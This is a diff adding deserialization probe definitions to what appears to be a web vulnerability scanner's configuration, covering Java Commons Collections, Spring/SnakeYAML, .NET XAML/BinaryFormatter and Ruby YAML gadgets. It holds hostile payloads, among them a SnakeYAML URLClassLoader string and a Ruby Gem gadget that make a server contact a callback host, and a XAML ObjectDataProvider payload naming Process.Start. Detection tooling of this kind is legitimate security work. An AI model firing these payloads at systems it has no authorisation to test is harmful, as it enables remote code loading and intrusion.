@@ -168,6 +168,114 @@
           "confidence_boost": 40
         }
       ]
+    },
+    "java_commons_collections": {
+      "description": "Java Commons Collections gadget chain detection — probes for CC1-CC7 deserialization gadgets via error message fingerprinting",
+      "tech_match": ["Java", "Tomcat", "JBoss", "WebLogic", "Spring"],
+      "param_match": ["data", "object", "payload", "token", "session", "viewstate", "state"],
+      "probes": [
+        {
+          "payload": "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBn",
+          "description": "Commons Collections LazyMap gadget (truncated base64) — ClassNotFoundException or InvokerTransformer in error confirms CC library is on classpath and deserialization occurs",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["InvokerTransformer", "LazyMap", "commons.collections", "ClassNotFoundException", "TransformedMap"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u",
+          "description": "Java BadAttributeValueExpException gadget (base64) — triggers toString() chain; error mentioning BadAttributeValueExpException confirms deserialization path",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["BadAttributeValueExpException", "ObjectInputStream", "readObject", "deserialization"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "spring_framework": {
+      "description": "Spring Framework deserialization — Spring-specific gadget chains and SpEL-based deserialization attacks",
+      "tech_match": ["Spring", "Spring Boot", "Java"],
+      "param_match": ["data", "object", "payload", "token", "session", "message"],
+      "probes": [
+        {
+          "payload": "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXI=",
+          "description": "Spring SerializableTypeWrapper gadget (base64) — Spring-specific class in error message confirms Spring deserialization is reachable",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["SerializableTypeWrapper", "springframework", "BeanFactory", "ClassNotFoundException"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://{{callback}}\"]]]]",
+          "description": "SnakeYAML deserialization probe — if Spring uses SnakeYAML for config parsing, triggers outbound connection to callback via URLClassLoader; check Collaborator for DNS interaction",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["SnakeYAML", "Constructor", "yaml.scanner", "could not determine a constructor"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "dotnet_objectdataprovider": {
+      "description": ".NET ObjectDataProvider and TypeConfuseDelegate gadget chain detection",
+      "tech_match": ["ASP.NET", "IIS", ".NET"],
+      "param_match": ["data", "object", "payload", "token", "__VIEWSTATE", "viewstate", "session"],
+      "probes": [
+        {
+          "payload": "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uSW50MzJbXQEAAAAITG93Qm91bmQIAAAAAAAAAA==",
+          "description": ".NET BinaryFormatter Int32 array probe (base64) — safe object that triggers deserialization; error mentioning BinaryFormatter or SerializationException confirms .NET deserialization is active",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["BinaryFormatter", "SerializationException", "ObjectDataProvider", "Type is not resolved"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"><ObjectDataProvider MethodName=\"Start\" ObjectType=\"{x:Type diagnostics:Process}\"><ObjectDataProvider.MethodParameters><sys:String>calc</sys:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>",
+          "description": ".NET XAML ObjectDataProvider detection — XAML parsing error or Process reference in error confirms XAML deserialization attack surface (detection only, does not execute)",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["ObjectDataProvider", "XamlReader", "ResourceDictionary", "System.Diagnostics"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "ruby_yaml_load": {
+      "description": "Ruby YAML.load unsafe deserialization — Ruby Psych YAML parser allows arbitrary object instantiation",
+      "tech_match": ["Ruby", "Rails"],
+      "param_match": ["data", "object", "payload", "session", "cookie", "config", "yaml"],
+      "probes": [
+        {
+          "payload": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://{{callback}}/yaml",
+          "description": "Ruby YAML Gem::Requirement gadget — triggers DNS/HTTP callback via Gem::Source fetch; check Collaborator for interaction. Psych or ArgumentError in error confirms YAML parsing",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["Psych::DisallowedClass", "YAML", "Gem::Requirement", "ArgumentError", "undefined class"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\nfoo: bar",
+          "description": "Rails NamedRouteCollection YAML gadget — Rails-specific class in error message confirms Rails YAML deserialization surface",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["NamedRouteCollection", "Psych", "DisallowedClass", "ActionController", "marshal"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
     }
   }
 }
